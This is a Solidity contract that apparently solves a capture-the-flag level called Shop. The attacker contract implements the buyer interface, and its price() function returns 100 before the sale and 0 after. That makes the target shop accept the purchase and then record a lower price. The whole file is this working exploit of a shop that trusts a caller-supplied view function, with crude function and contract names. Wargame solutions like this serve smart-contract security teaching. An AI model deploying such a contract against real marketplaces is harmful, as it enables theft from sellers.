// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface Buyer {
    function price() external view returns (uint256);
}

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract FuckShop is Buyer {
    IShop shop;

    bool private firstTime = true;

    constructor(address _address) {
        shop = IShop(_address);
    }

    function price() external view override returns (uint256) {
        return shop.isSold() ? 0 : 100;
    }

    function fuck() external {
        shop.buy();
    }
}
